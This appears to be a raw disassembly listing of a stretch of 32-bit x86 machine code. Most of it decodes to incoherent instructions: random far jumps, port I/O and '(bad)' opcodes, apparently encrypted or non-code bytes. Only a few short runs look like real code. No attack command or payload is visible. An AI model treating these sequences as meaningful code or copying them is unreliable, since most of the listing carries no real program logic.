  41313a:	mov    WORD PTR [eax+ebx*2-0x4c],gs
  41313e:	mov    WORD PTR [edi-0x6034f130],cs
  413144:	jmp    0xdd3f5b53
  413149:	aam    0xf3
  41314b:	xchg   edx,eax
  41314c:	xor    esp,DWORD PTR [edi+0x7]
  41314f:	das    
  413150:	jmp    0xbc829f76
  413155:	neg    BYTE PTR ds:0xce729364
  41315b:	ins    DWORD PTR es:[edi],dx
  41315c:	or     esp,DWORD PTR [eax+0x524a1d9f]
  413162:	stos   BYTE PTR es:[edi],al
  413163:	push   ebx
  413164:	inc    esp
  413165:	mov    eax,ds:0xb9f6a7
  41316a:	mov    bh,0x62
  41316c:	sub    al,0xf1
  41316e:	in     al,dx
  41316f:	(bad)  
  413170:	aaa    
  413171:	icebp  
  413172:	sub    eax,DWORD PTR [ebx-0x2f841fda]
  413178:	jns    0x41312a
  41317a:	sbb    cl,BYTE PTR [ebp-0x488611e5]
  413180:	and    bl,cl
  413182:	sub    ah,BYTE PTR [edi-0x71]
  413185:	xchg   ebx,eax
  413186:	aas    
  413187:	shl    DWORD PTR [eax-0x29c11152],cl
  41318d:	pop    ds
  41318e:	jnp    0x413182
  413190:	xor    eax,0xc5ba042f
  413195:	int3   
  413196:	push   esp
  413197:	out    dx,eax
  413198:	dec    edi
  413199:	fidivr WORD PTR [ebx+0x23b75177]
  41319f:	out    dx,al
  4131a0:	or     al,0x4d
  4131a2:	popa   
  4131a3:	sahf   
  4131a4:	dec    ecx
  4131a5:	ins    DWORD PTR es:[edi],dx
  4131a6:	xchg   ebp,eax
  4131a7:	enter  0x29bd,0xe3
  4131ab:	inc    ebp
  4131ac:	pop    edx
  4131ad:	cli    
  4131ae:	lea    edi,[edi-0x83ebd5a]
  4131b4:	mov    dl,0xef
  4131b6:	pop    ecx
  4131b7:	add    BYTE PTR [ebx+0x7513246b],0x7e
  4131be:	xchg   ebx,eax
  4131bf:	ss cwde 
  4131c1:	sub    al,0xce
  4131c3:	call   0xe183f800
  4131c8:	mov    ds:0x4e7044a7,al
  4131cd:	jbe    0x41315e
  4131cf:	sahf   
  4131d0:	add    BYTE PTR [esi+0x652e5b5c],al
  4131d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131d7:	scas   al,BYTE PTR es:[edi]
  4131d8:	retf   
  4131d9:	cli    
  4131da:	cmp    DWORD PTR [ebp+0x18],0x4b
  4131de:	aaa    
  4131df:	xchg   ebx,eax
  4131e0:	fnstenv [edi+0x4f]
  4131e3:	lock pop eax
  4131e5:	mov    edi,0x9deeea3f
  4131ea:	or     al,0x9
  4131ec:	int    0x9f
  4131ee:	rcl    DWORD PTR [edi-0x22],0xad
  4131f2:	inc    edx
  4131f3:	test   BYTE PTR [eax],al
  4131f5:	mov    ebp,0x5a71ca15
  4131fa:	inc    ebx
  4131fb:	mov    ds:0x5faf7488,eax
  413200:	fidivr DWORD PTR [edx+0x75]
  413203:	dec    ecx
  413204:	add    BYTE PTR [edi],dh
  413206:	outs   dx,BYTE PTR ds:[esi]
  413207:	ret    0x4d9c
  41320a:	clc    
  41320b:	int3   
  41320c:	xlat   BYTE PTR ds:[ebx]
  41320d:	fnstsw WORD PTR [edx-0x201e656b]
  413213:	imul   edi
  413215:	out    dx,eax
  413216:	lgs    edi,FWORD PTR [ecx+0xf]
  41321a:	mov    ds:0x1ca7ad06,eax
  41321f:	xor    cl,ch
  413221:	jns    0x41327c
  413223:	scas   eax,DWORD PTR es:[edi]
  413224:	jae    0x41329f
  413226:	inc    edx
  413227:	ret    
  413228:	fwait
  413229:	inc    ebp
  41322a:	jmp    0x413248
  41322c:	outs   dx,DWORD PTR ds:[esi]
  41322d:	xor    cl,cl
  41322f:	jle    0x4131e9
  413231:	dec    eax
  413232:	div    esp
  413234:	mov    esp,0xe5bc133b
  413239:	lds    eax,FWORD PTR [ebp-0x11]
  41323c:	outs   dx,BYTE PTR ds:[esi]
  41323d:	adc    al,0x35
  41323f:	cmp    DWORD PTR [ecx+0x4c],esp
  413242:	xor    edx,DWORD PTR [edi]
  413244:	jne    0x4132bf
  413246:	xor    DWORD PTR [ebp+0x1a],0x76
  41324a:	inc    esp
  41324b:	mov    BYTE PTR [ebp-0x27],cl
  41324e:	enter  0xbd58,0xa7
  413252:	jnp    0x413255
  413254:	fcom   st(5)
  413256:	cdq    
  413257:	push   ds
  413258:	jl     0x4132d1
  41325a:	adc    al,0xd0
  41325c:	inc    esi
  41325d:	jne    0x41329b
  41325f:	push   es
  413260:	dec    esi
  413261:	sub    ecx,DWORD PTR [edx]
  413263:	popa   
  413264:	js     0x413268
  413266:	cdq    
  413267:	dec    edi
  413268:	popf   
  413269:	push   esi
  41326a:	lods   al,BYTE PTR ds:[esi]
  41326b:	inc    ebp
  41326c:	int    0x27
  41326e:	call   0x68383501
  413273:	sbb    BYTE PTR [edi],cl
  413275:	lods   al,BYTE PTR ds:[esi]
  413276:	mov    dl,0x12
  413278:	or     bl,BYTE PTR [esi]
  41327a:	push   cs
  41327b:	call   0xcc02:0xbee2f53e
  413282:	adc    eax,edi
  413284:	call   0x77a2:0x1104c3aa
  41328b:	sbb    al,0x67
  41328d:	aam    0xbe
  41328f:	arpl   WORD PTR [ebp+0x78],bx
  413292:	(bad)
  413296:	clc    
  413297:	je     0x413287
  413299:	inc    edi
  41329a:	dec    ebx
  41329b:	mov    cl,0x4c
  41329d:	jb     0x413301
  41329f:	cdq    
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	mov    DWORD PTR ds:0xbad81cd6,ebp
  4132a7:	mov    bh,0x8b
  4132a9:	push   0xffffffaa
  4132ab:	aad    0x2e
  4132ad:	mov    dh,0x86
  4132af:	popf   
  4132b0:	iret   
  4132b1:	jb     0x4132b0
  4132b3:	push   ebp
  4132b4:	bound  ebx,QWORD PTR [eax+eiz*4+0x58]
  4132b8:	sahf   
  4132b9:	jo     0x4132e6
  4132bb:	mov    ebp,0x3747671a
  4132c0:	cmp    al,0xab
  4132c2:	push   cs
  4132c3:	add    edx,DWORD PTR [ebx-0x1ffe6d39]
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	ds adc al,0xa3
  4132cd:	or     al,0x2e
  4132cf:	scas   al,BYTE PTR es:[edi]
  4132d0:	xlat   BYTE PTR ds:[ebx]
  4132d1:	push   esp
  4132d2:	inc    edx
  4132d3:	pusha  
  4132d4:	pop    eax
  4132d5:	test   eax,0xd69ec4d9
  4132da:	mov    ebp,0x4f19a33d
  4132df:	call   0x1914:0x56e63bfb
  4132e6:	mov    ds:0xc03d27b9,al
  4132eb:	push   ebx
  4132ec:	bound  edi,QWORD PTR [ebx+0x9167223]
  4132f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132f4:	clc    
  4132f5:	into   
  4132f6:	(bad)  
  4132f7:	and    bh,cl
  4132f9:	pop    esp
  4132fa:	int    0x63
  4132fc:	jle    0x4132c8
  4132fe:	sbb    DWORD PTR [ecx+0x18],eax
  413301:	or     esp,DWORD PTR [edi+0x20]
  413304:	jl     0x41330a
  413306:	inc    esi
  413307:	test   DWORD PTR [ecx-0x58],edx
  41330a:	sbb    BYTE PTR [edi+0xf],0x69
  41330e:	or     cl,bl
  413310:	mov    ss,WORD PTR [edx+0x2a]
  413313:	sub    ah,BYTE PTR ds:0x8b85fd31
  413319:	push   ebx
  41331a:	mov    ch,0x55
  41331c:	xchg   edx,eax
  41331d:	adc    ebx,DWORD PTR [ebp+0x7ddeab17]
  413323:	adc    eax,0xdad929e4
  413328:	push   ecx
  413329:	mov    bh,al
  41332b:	cmp    BYTE PTR [esi-0x6d],dh
  41332e:	jno    0x413339
  413330:	fcmovb st,st(1)
  413332:	out    dx,al
  413333:	cld    
  413334:	push   cs
  413335:	les    edi,FWORD PTR [edx]
  413337:	cwde   
  413338:	hlt    
  413339:	inc    sp
  41333b:	int3   
  41333c:	out    0xf5,al
  41333e:	into   
  41333f:	push   esp
  413340:	add    eax,0xbe8ffb89
  413345:	and    eax,0xd7bf2715
  41334a:	dec    edi
  41334b:	add    ebx,DWORD PTR [ebp-0x2c186a3b]
  413351:	into   
  413352:	sub    al,0x6e
  413354:	inc    ebp
  413355:	lock inc edi
  413357:	sub    eax,0x8b9cbc6c
  41335c:	mov    eax,ds:0xf1a9b144
  413361:	fsubp  st(1),st
  413363:	cdq    
  413364:	push   ecx
  413365:	lods   al,BYTE PTR ds:[esi]
  413366:	or     al,0xd
  413368:	mov    cl,0xb1
  41336a:	popa   
  41336b:	pop    esi
  41336c:	lock jmp 0x8fa17e50
  413372:	iret   
  413373:	into   
  413374:	fadd   QWORD PTR [ebx]
  413376:	outs   dx,DWORD PTR ds:[esi]
  413377:	and    eax,0x1fa0b4ed
  41337c:	xchg   edx,eax
  41337d:	sub    dl,BYTE PTR [ebp-0x4e0c168a]
  413383:	pushf  
  413384:	dec    ecx
  413385:	mov    bh,0x1f
  413387:	repz data16 mov al,0xfd
  41338b:	mov    eax,0xe85ea4da
  413390:	or     DWORD PTR [ebx],edx
  413392:	shl    BYTE PTR [edx-0x7c13e7eb],0xd6
  413399:	stos   DWORD PTR es:[edi],eax
  41339a:	aas    
  41339b:	mov    bl,BYTE PTR [ebx-0x46]
  41339e:	xchg   ecx,eax
  41339f:	daa    
  4133a0:	(bad)  
  4133a1:	pushf  
  4133a2:	iret   
  4133a3:	lock aas 
  4133a5:	inc    ecx
  4133a6:	fisub  WORD PTR [ebx]
  4133a8:	test   DWORD PTR [eax+0x2a],edi
  4133ab:	je     0x41338a
  4133ad:	cwde   
  4133ae:	cmp    esi,DWORD PTR [ecx+0x58489007]
  4133b4:	pop    ds
  4133b5:	imul   BYTE PTR [eax]
  4133b7:	into   
  4133b8:	mov    ebx,0x67fd0fe
  4133bd:	xchg   esi,eax
  4133be:	and    DWORD PTR ds:0xb13f91f3,eax
  4133c4:	int3   
  4133c5:	pop    ss
  4133c6:	inc    edi
  4133c7:	sub    BYTE PTR ds:0xf5ba857d,ah
  4133cd:	enter  0xc2a4,0xc9
  4133d1:	int    0x1b
  4133d3:	rol    esi,1
  4133d5:	xor    esp,DWORD PTR [ebp-0x10]
  4133d8:	gs xchg ebx,eax
  4133da:	mov    ebp,0x1b4a319d
  4133df:	aas    
  4133e0:	or     dh,BYTE PTR ds:0x74540fc9
  4133e6:	mov    al,ds:0x6a76cbc3
  4133eb:	stc    
  4133ec:	cmc    
  4133ed:	jae    0x413398
  4133ef:	into   
  4133f0:	(bad)  
  4133f1:	ins    DWORD PTR es:[edi],dx
  4133f2:	cmp    dl,dh
  4133f4:	mov    ds:0x8831694d,al
  4133f9:	jo     0x413471
  4133fb:	add    bl,ch
  4133fd:	pop    ebp
  4133fe:	cmp    edi,eax
  413400:	lock fs (bad) 
  413403:	aas    
  413404:	jne    0x41346f
  413406:	lds    edi,FWORD PTR [edi]
  413408:	rol    BYTE PTR [ebx],cl
  41340a:	fisttp QWORD PTR [ecx]
  41340c:	mov    ecx,0x7a5b3f0f
  413411:	sub    esi,DWORD PTR [esi]
  413413:	pushw  ds
  413415:	mov    eax,0x55741268
  41341a:	adc    DWORD PTR [edx],edi
  41341c:	jle    0x4133aa
  41341e:	loop   0x4133fe
  413420:	mov    BYTE PTR [ebp+0x13],bl
  413423:	cmc    
  413424:	mov    eax,ds:0x6e2f2306
  413429:	or     ebx,DWORD PTR [esi+esi*2-0x3b]
  41342d:	out    0xe2,al
  41342f:	mov    ecx,0x335515e8
  413434:	test   al,0xbd
  413436:	sbb    al,0xc4
  413438:	pop    ss
  413439:	in     al,dx
  41343a:	js     0x4133fb
  41343c:	and    al,0x73
  41343e:	xor    BYTE PTR [eax+ebp*1-0x3b],0x50
  413443:	mov    esp,0xf5882b8c
  413448:	stos   DWORD PTR es:[edi],eax
  413449:	lea    edi,[esi]
  41344b:	xor    cl,BYTE PTR [ecx]
  41344d:	mov    esi,0xb3009433
  413452:	jge    0x4133e2
  413454:	scas   eax,DWORD PTR es:[edi]
  413455:	xchg   edi,eax
  413456:	fwait
  413457:	shl    esi,cl
  413459:	dec    esi
  41345a:	push   esi
  41345b:	jecxz  0x41349e
  41345d:	add    BYTE PTR [ebx],al
  41345f:	pop    eax
  413460:	stc    
  413461:	push   0x585faddf
  413466:	dec    edx
  413467:	scas   eax,DWORD PTR es:[edi]
  413468:	sbb    al,dh
  41346a:	pop    ss
  41346b:	stc    
  41346c:	jecxz  0x4134cd
  41346e:	and    al,0x14
  413470:	fldcw  WORD PTR [ebx+esi*4+0x62]
  413474:	mov    esp,0x10430351
  413479:	iret   
  41347a:	sbb    DWORD PTR [ecx+0x386eec36],edx
  413480:	dec    ebp
  413481:	aam    0x56
  413483:	push   edx
  413484:	lea    edi,[esi+0x1064aff4]
  41348a:	cmp    eax,0x52fe19d2
  41348f:	daa    
  413490:	mov    bl,0x6c
  413492:	xchg   DWORD PTR [edx],eax
  413494:	dec    ebp
  413495:	push   ds
  413496:	mov    al,0xae
  413498:	sub    eax,0x5e57a814
  41349d:	std    
  41349e:	push   esp
  41349f:	push   cs
  4134a0:	adc    al,0x80
  4134a2:	jnp    0x4134ee
  4134a4:	add    BYTE PTR [ecx+0x9573d2],0x0
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x4220b1
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx+0x536709f]
  4134d4:	xchg   edi,eax
  4134d5:	mov    esp,0x18184264
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [ecx-0x52],cl
  4134e0:	sbb    bh,bl
  4134e2:	rcl    ebp,cl
  4134e4:	cli    
  4134e5:	dec    esp
  4134e6:	xor    eax,DWORD PTR [esi-0x22]
  4134e9:	push   0xc
  4134eb:	repnz push cs
  4134ed:	lods   eax,DWORD PTR ds:[esi]
  4134ee:	xor    eax,0xa9a8c0cc
  4134f3:	je     0x41352e
  4134f5:	loop   0x41356b
  4134f7:	in     eax,0x15
  4134f9:	jp     0x413503
  4134fb:	(bad)  
  4134fc:	mov    al,0x6b
  4134fe:	stos   DWORD PTR es:[edi],eax
  4134ff:	cdq    
  413500:	or     edx,DWORD PTR [eax]
  413502:	call   0xcea8ae94
  413507:	cmp    eax,0xfd5c41c9
  41350c:	int3   
  41350d:	push   cs
  41350e:	fst    QWORD PTR [ecx]
  413510:	into   
  413511:	add    ecx,edx
  413513:	and    dl,ch
  413515:	add    BYTE PTR [esi+0x5f],bl
  413518:	sub    al,0x91
  41351a:	sub    eax,DWORD PTR [ebx]
  41351c:	aam    0xf0
  41351e:	int    0xe5
  413520:	jle    0x4134d5
  413522:	jl     0x413556
  413524:	(bad)  
  413525:	es icebp 
  413527:	aad    0x7f
  413529:	pop    ss
  41352a:	mov    esi,ss
  41352c:	push   esi
  41352d:	xor    dh,BYTE PTR [esi+edi*4+0x7495b59d]
  413534:	(bad)  
  413536:	fs aad 0xb1
  413539:	iret   
  41353a:	xchg   esp,eax
  41353b:	or     BYTE PTR [ebx],al
  41353d:	int    0x4b
  41353f:	adc    eax,0x98a7c8b9
  413544:	jb     0x413582
  413546:	jns    0x4134d1
  413548:	mov    al,ds:0xd819c8f6
  41354d:	mov    ebx,DWORD PTR [ebx]
  41354f:	out    0xe6,al
  413551:	and    DWORD PTR [edi+0x51],0x7a
  413555:	repz test eax,0xbf3dfa67
  41355b:	fidivr WORD PTR [ebx-0x210545d3]
  413561:	push   ebx
  413562:	fisub  DWORD PTR [edi+0x23]
  413565:	mov    dl,0x96
  413567:	adc    BYTE PTR [edx],bl
  413569:	stos   BYTE PTR es:[edi],al
  41356a:	retf   0x98c5
  41356d:	push   edx
  41356e:	sub    eax,0xeed40892
  413573:	popa   
  413574:	inc    ecx
  413575:	in     al,0xb6
  413577:	nop
  413578:	out    dx,eax
  413579:	dec    esp
  41357a:	out    dx,al
  41357b:	popf   
  41357c:	jmp    0x1e3b074c
  413581:	sub    ebx,edx
  413583:	cmp    DWORD PTR [esp+ecx*2],0xffffffe6
  413587:	xor    DWORD PTR [esp+ebp*2-0x1739827],edi
  41358e:	jge    0x41353f
  413590:	push   0x9e614b33
  413595:	lahf   
  413596:	xchg   esi,eax
  413597:	add    ecx,DWORD PTR [ecx]
  413599:	aaa    
  41359a:	mov    ebp,0xbe9933d
  41359f:	sti    
  4135a0:	popa   
  4135a1:	xor    ebp,esp
  4135a3:	repz cmp al,bh
  4135a6:	jmp    0x45a52471
  4135ab:	test   eax,0xfe1c03c4
  4135b0:	ds mov ebx,0xe96ff4fc
  4135b6:	xlat   BYTE PTR ds:[ebx]
  4135b7:	loopne 0x41357b
  4135b9:	fiadd  WORD PTR [edi+ebx*8-0x40]
  4135bd:	xchg   edx,eax
  4135be:	(bad)  
  4135bf:	dec    esi
  4135c0:	mov    ch,0x32
  4135c2:	jg     0x4135b6
  4135c4:	push   ss
  4135c5:	cmp    eax,0x7c640709
  4135ca:	dec    ebx
  4135cb:	inc    edi
  4135cc:	and    edi,DWORD PTR [eax]
  4135ce:	scas   al,BYTE PTR es:[edi]
  4135cf:	cs adc eax,0xa51201d
  4135d5:	push   eax
  4135d6:	and    BYTE PTR [edi],bl
  4135d8:	retf   0xf560
  4135db:	push   esi
  4135dc:	aad    0x39
  4135de:	in     al,0x98
  4135e0:	mov    ds:0xf9ea92dd,eax
  4135e5:	in     eax,0x95
  4135e7:	inc    ecx
  4135e8:	cs lods eax,DWORD PTR cs:[esi]
  4135eb:	pop    ebp
  4135ec:	out    0x44,al
  4135ee:	enter  0xa11b,0x5a
  4135f2:	adc    edi,DWORD PTR [esi]
  4135f4:	fdivr  QWORD PTR [ecx+0x6c]
  4135f7:	cdq    
  4135f8:	mov    al,ds:0xef85d773
  4135fd:	mov    cl,0x95
  4135ff:	das    
  413600:	cmp    DWORD PTR [esi+0x5c11bf06],edx
  413606:	push   eax
  413607:	sbb    al,0x81
  413609:	jl     0x413683
  41360b:	push   esp
  41360c:	(bad)  
  41360d:	ja     0x4135e0
  41360f:	sub    BYTE PTR [esp+ecx*4+0x61c04869],dl
  413616:	mov    esp,edi
  413618:	dec    ebp
  41361a:	sub    edi,0x35540b52
  413620:	push   ss
  413621:	iret   
  413622:	dec    esp
  413623:	push   0x71a3aa69
  413628:	jb     0x4135ca
  41362a:	dec    BYTE PTR [edx-0x24d9e96c]
  413630:	ror    DWORD PTR [edi],1
  413632:	mov    edi,0xe6192ff3
  413637:	jo     0x4135fc
  413639:	add    ah,BYTE PTR [ebx+0x73]
  41363c:	jg     0x4136b5
  41363e:	xchg   ecx,eax
  41363f:	out    dx,eax
  413640:	js     0x4136a5
  413642:	int3   
  413643:	daa    
  413644:	jb     0x413694
  413646:	mov    ecx,0xacf7b21f
  41364b:	sbb    eax,0x43e8d527
  413650:	adc    cl,BYTE PTR [ecx+0x50]
  413653:	sub    al,0x5c
  413655:	leave  
  413656:	shl    cl,0x53
  413659:	and    BYTE PTR [esi-0x7f],bl
  41365c:	inc    BYTE PTR [ecx]
  41365e:	aam    0xe0
  413660:	pop    ds
  413661:	(bad)  
  413662:	fwait
  413663:	in     al,0xa8
  413665:	pusha  
  413666:	push   cs
  413667:	into   
  413668:	js     0x4136c8
  41366a:	jle    0x4135fc
  41366c:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41366e:	mov    edx,ecx
  413670:	fidivr DWORD PTR [ebx-0x4a]
  413673:	jo     0x41366d
  413675:	xor    bh,al
  413677:	adc    al,0x71
  413679:	mov    ebx,0x86e0a31d
  41367e:	ss dec ebp
  413680:	mov    ebx,0x30705ff1
  413685:	push   ebp
  413686:	(bad)  
  413687:	out    0xcf,eax
  413689:	mov    dl,0x49
  41368b:	sbb    eax,0xfe53051c
  413690:	sbb    bh,ch
  413692:	cdq    
  413693:	jns    0x413688
  413695:	into   
  413696:	cld    
  413697:	in     al,0xee
  413699:	mov    cs,WORD PTR [eax-0x69]
  41369c:	sbb    al,BYTE PTR [esi-0x9]
  41369f:	xor    al,0x43
  4136a1:	add    BYTE PTR ds:0xfee56c1f,dh
  4136a7:	xchg   ebp,eax
  4136a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136a9:	stc    
  4136aa:	loope  0x41366d
  4136ac:	jg     0x41369c
  4136ae:	sub    dl,BYTE PTR [edi]
  4136b0:	enter  0x624f,0x97
  4136b4:	or     al,0xd7
  4136b6:	push   ebp
  4136b7:	enter  0x767c,0x17
  4136bb:	outs   dx,BYTE PTR ds:[esi]
  4136bc:	inc    edi
  4136bd:	jb     0x4136ae
  4136bf:	loopne 0x41373f
  4136c1:	pop    ebx
  4136c2:	dec    ebx
  4136c3:	fisubr DWORD PTR [ecx-0x2c]
  4136c6:	loopne 0x4136d5
  4136c8:	inc    edx
  4136c9:	loope  0x4136fa
  4136cb:	and    ebp,DWORD PTR [eax-0x44]
  4136ce:	cmp    ebx,ebx
  4136d0:	fild   WORD PTR [eax-0x185d2ca6]
  4136d6:	jecxz  0x413744
  4136d8:	add    BYTE PTR [esi+0x2f],dl
  4136db:	scas   al,BYTE PTR es:[edi]
  4136dc:	xor    eax,0xa5999e87
  4136e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136e2:	mov    dl,0xc0
  4136e4:	jle    0x413755
  4136e6:	mov    ch,BYTE PTR [ecx]
  4136e8:	or     DWORD PTR [ebp*4+0x55de659e],ecx
  4136ef:	push   ds
  4136f0:	adc    dh,BYTE PTR [edi+0x56e5d9ca]
  4136f6:	pushf  
  4136f7:	xor    al,0x21
  4136f9:	lods   eax,DWORD PTR ds:[esi]
  4136fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136fb:	jmp    0x413728
  4136fd:	and    eax,0x1c74a84b
  413702:	pop    esp
  413703:	adc    BYTE PTR [ebx-0x55f9a49],cl
  413709:	and    eax,0x1087a939
  41370e:	bound  ebx,QWORD PTR [edi+0x57f1cfa7]
  413714:	jle    0x41371d
  413716:	xor    al,0x4f
  413718:	mov    al,0xf9
  41371a:	mov    bl,0xc
  41371c:	mov    BYTE PTR [ebp-0x29ddab50],bh
  413722:	cs jg  0x413784
  413725:	push   esi
  413726:	mov    edx,0xe7bb442f
  41372b:	xchg   esp,eax
  41372c:	pop    edx
  41372d:	lock or al,0x79
  413730:	xor    ecx,DWORD PTR [esi-0x2fec5bfb]
  413736:	xor    ebx,DWORD PTR [eax+0x17f12f8f]
  41373c:	add    DWORD PTR [edi],ecx
  41373e:	jecxz  0x41379c
  413740:	push   ecx
  413741:	push   ebx
  413742:	sahf   
  413743:	sahf   
  413744:	mov    eax,0x3a59214
  413749:	cmp    ebx,eax
  41374b:	mov    ecx,0x39f8a12a
  413750:	and    eax,0x31afb0cf
  413755:	pop    edi
  413756:	push   ds
  413757:	sub    dl,BYTE PTR [ebx]
  413759:	stos   BYTE PTR es:[edi],al
  41375a:	jl     0x4137b5
  41375c:	xor    bl,BYTE PTR [edx]
  41375e:	jb     0x413760
  413760:	loop   0x4137b5
  413762:	bound  esp,QWORD PTR [edi+0x5c]
  413765:	sbb    al,0x1b
  413767:	pop    esp
  413768:	ja     0x413790
  41376a:	inc    edx
  41376b:	xchg   ecx,eax
  41376c:	mov    al,cl
  41376e:	retf   
  41376f:	add    ebx,DWORD PTR [edi-0xc0dbc8b]
  413775:	fwait
  413776:	sar    BYTE PTR [esi+ecx*8],1
  413779:	mov    al,ds:0xb4b027a4
  41377e:	arpl   WORD PTR [ebx],si
  413780:	jno    0x413770
  413782:	jl     0x413741
  413784:	cmc    
  413785:	out    0xb8,al
  413787:	sbb    bh,0x70
  41378a:	ja     0x413776
  41378c:	mov    esp,0xa9879ec8
  413791:	mov    edx,0xdba23d67
  413796:	adc    al,0xb5
  413798:	outs   dx,DWORD PTR es:[esi]
  41379a:	adc    DWORD PTR [edx+ebx*8],ebx
  41379d:	lea    ebp,[eax]
  41379f:	les    ecx,FWORD PTR [ecx]
  4137a1:	adc    eax,0xf1cc492f
  4137a6:	and    al,0x51
  4137a8:	mov    eax,0xd007120
  4137ad:	xlat   BYTE PTR ds:[ebx]
  4137ae:	in     al,0xf9
  4137b0:	add    DWORD PTR [eax+0x37f95149],ebx
  4137b6:	ret    
  4137b7:	shl    BYTE PTR [ecx+edi*1-0xd],0x8
  4137bc:	mov    esp,0x46ed77fc
  4137c1:	fcomp  DWORD PTR [ebx-0x6b]
  4137c4:	jg     0x4137b5
  4137c6:	rcr    DWORD PTR [edx+0x32],cl
  4137c9:	push   0x26
  4137cb:	mov    ebx,0x20399c3f
  4137d0:	sub    bh,dh
  4137d2:	pop    edi
  4137d3:	std    
  4137d4:	or     cl,BYTE PTR [eax-0x8]
  4137d7:	fisttp DWORD PTR [ecx]
  4137d9:	pop    ss
  4137da:	or     al,0xd7
  4137dc:	cmp    DWORD PTR [edx],ebx
  4137de:	int3   
  4137df:	in     al,dx
  4137e0:	mov    edi,0x61abd8a3
  4137e5:	xchg   esp,eax
  4137e6:	jp     0x413768
  4137e8:	mov    cl,0xd2
  4137ea:	dec    edi
  4137eb:	test   edx,eax
  4137ed:	adc    dh,0xf5
  4137f0:	dec    ecx
  4137f1:	sbb    al,BYTE PTR [edi-0x3]
  4137f4:	scas   eax,DWORD PTR es:[edi]
  4137f5:	pop    esp
  4137f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137f7:	push   DWORD PTR [ebx]
  4137f9:	loopne 0x4137f2
  4137fb:	inc    dh
  4137fd:	xor    bh,BYTE PTR gs:[esi]
  413800:	mov    ah,bh
  413802:	add    bh,BYTE PTR [esi-0x19]
  413805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413806:	ror    DWORD PTR [edx+0x50],0x92
  41380a:	out    0xc8,al
  41380c:	fnsave [edi+0x21]
  41380f:	pusha  
  413810:	cmp    ch,ah
  413812:	fwait
  413813:	ror    BYTE PTR [ebp+eiz*4-0x4d298aab],cl
  41381a:	sub    esi,DWORD PTR [esi]
  41381c:	repz jg 0x41389c
  41381f:	shl    eax,cl
  413821:	outs   dx,BYTE PTR ds:[esi]
  413822:	adc    bl,cl
  413824:	loop   0x4137d9
  413826:	ret    0xc9a4
  413829:	push   ds
  41382a:	(bad)  
  41382b:	cmp    eax,0xec4b1c38
  413830:	dec    ebp
  413831:	test   eax,0xc5cef999
  413836:	into   
  413837:	call   0x57cb0edf
  41383c:	mov    cl,0xaa
  41383e:	stos   DWORD PTR es:[edi],eax
  41383f:	arpl   WORD PTR [ebx],di
  413841:	and    eax,0x30d3b6ec
  413846:	push   ds
  413847:	mov    al,cl
  413849:	jge    0x4138b1
  41384b:	enter  0xbdd6,0xf5
  41384f:	ficom  WORD PTR [edx]
  413851:	sar    DWORD PTR [eax+eax*1],0xad
  413855:	inc    esi
  413857:	jae    0x413814
  413859:	mov    esi,0xa1fddbf3
  41385e:	push   esp
  41385f:	gs xchg ebp,eax
  413861:	ror    DWORD PTR [eax],1
  413863:	fimul  WORD PTR [esi+edi*2]
  413866:	out    dx,al
  413867:	pop    ecx
  413868:	or     BYTE PTR [ebx+edi*8+0x43],dh
  41386c:	gs imul dl
  41386f:	pop    esp
  413870:	sbb    edx,0x5e
  413873:	dec    ebp
  413874:	data16 jecxz 0x413887
  413877:	shl    DWORD PTR [ebx-0x42],cl
  41387a:	mov    DWORD PTR [esi-0x7b60b02d],0x70bc6a08
  413884:	mov    bh,0xd3
  413886:	scas   eax,DWORD PTR es:[edi]
  413887:	mov    ecx,0x803430b5
  41388c:	push   0xc6884e28
  413891:	shl    DWORD PTR [edi+eax*1],cl
  413894:	fst    QWORD PTR [ecx-0x7436ace1]
  41389a:	pop    ebp
  41389b:	in     al,0x81
  41389d:	icebp  
  41389e:	mov    ebx,DWORD PTR [ebx]
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx-0x59],ebp
  4138e5:	sar    BYTE PTR [ebp-0x50],0xf7
  4138e9:	cmp    bl,BYTE PTR [eax]
  4138eb:	sbb    BYTE PTR [edx-0x76e7e7ee],ch
  4138f1:	mov    ebp,0xc2202fa1
  4138f6:	and    DWORD PTR [esi-0x2e],0x5f
  4138fa:	shl    BYTE PTR [ebp-0x6a],0x78
  4138fe:	leave  
  4138ff:	aam    0xda
  413901:	mov    esi,0x9760e670
  413906:	fwait
  413907:	push   ecx
